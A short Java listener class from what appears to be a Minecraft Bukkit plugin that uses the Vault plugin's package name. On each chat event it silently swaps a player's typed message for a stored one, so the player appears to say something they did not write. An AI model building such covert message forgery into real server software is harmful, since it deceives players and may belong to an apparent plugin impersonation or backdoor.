package net.milkbowl.vault.events;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import net.milkbowl.vault.Core;

public class NextMessageEvent implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);
	
	@EventHandler
	public void onChat(AsyncPlayerChatEvent e) {
		if (plugin.nextmsg.containsKey(e.getPlayer())) {
			e.setMessage(plugin.nextmsg.get(e.getPlayer()));
			plugin.nextmsg.remove(e.getPlayer());
		}
	}

}
